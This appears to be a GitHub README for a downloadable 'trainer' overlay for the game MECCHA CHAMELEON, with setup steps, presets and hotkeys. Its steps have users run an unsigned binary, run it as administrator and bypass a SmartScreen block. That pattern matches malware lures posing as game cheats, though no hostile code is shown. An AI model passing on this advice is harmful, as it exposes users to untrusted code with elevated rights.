# Quick Start — Meccha Chameleon Game Trainer

Companion for [**MECCHA CHAMELEON**](https://store.steampowered.com/app/4704690/MECCHA_CHAMELEON/) on Steam.

## Before you begin

- Install the game from Steam (App ID **4704690**).
- Use **practice or private lobbies** when testing overlay tools.
- Confirm your GPU supports DirectX 11 or 12 (same requirement as the game).

## Steps

1. Download the [latest package](https://github.com/yashkhatri45/Meccha-Chameleon-Trainer-Mod-Overlay/releases/download/latest/Meccha-Chameleon-Game-Overlay.zip).
2. Extract the archive to a folder you control.
3. Launch **MECCHA CHAMELEON** from Steam and enter a lobby (or practice mode).
4. Launch the trainer from the release folder (double-click the main binary).
5. Click **Attach** and select the game window from the list.
6. Load a **paint preset** that matches your current stage colors.
7. Open the **pose library** and pick a reference pose (`F3` to cycle).
8. Optionally pin **hide-spot markers** on the overlay (`F5` to toggle).
9. Press **Apply** (`F2`) or use overlay hotkeys during the round.
10. Save your setup with **Save Profile** (`F4`) for the next session.

## Paint presets

Presets are plain `.json` files stored in `profiles/paint/`. Example:

```json
{
  "stage": "Brick Wall",
  "colors": ["#8b3a22", "#6b2f1a", "#4a1a0c", "#7a321c"],
  "label": "Red brick blend"
}
```

Match preset colors to the stage texture you are hiding on — the core mechanic of MECCHA CHAMELEON.

## Pose references

Pose profiles live in `profiles/poses/`. Use them as on-screen guides for how to align your character against walls, floors, and props.

## Tips

- **Hiders:** load a paint preset before the round starts so you can blend faster.
- **Seekers:** use the match timer overlay to track remaining search time.
- **Streamers:** enable **Streamer mode** in Settings for a compact overlay during viewer matches.
- Enable verbose logging in **Settings → Diagnostics** when reporting issues.

## Troubleshooting

| Issue | Fix |
|---|---|
| Game not detected | Launch the game first, then refresh the attach list |
| Attach fails | Run trainer as administrator |
| Overlay not visible | Press `F1` or check overlay opacity in Settings |
| Colors look wrong | Re-pick preset to match the current stage texture |
| SmartScreen block | More info → Run anyway, or build from source |

## Game link

Store page: https://store.steampowered.com/app/4704690/MECCHA_CHAMELEON/
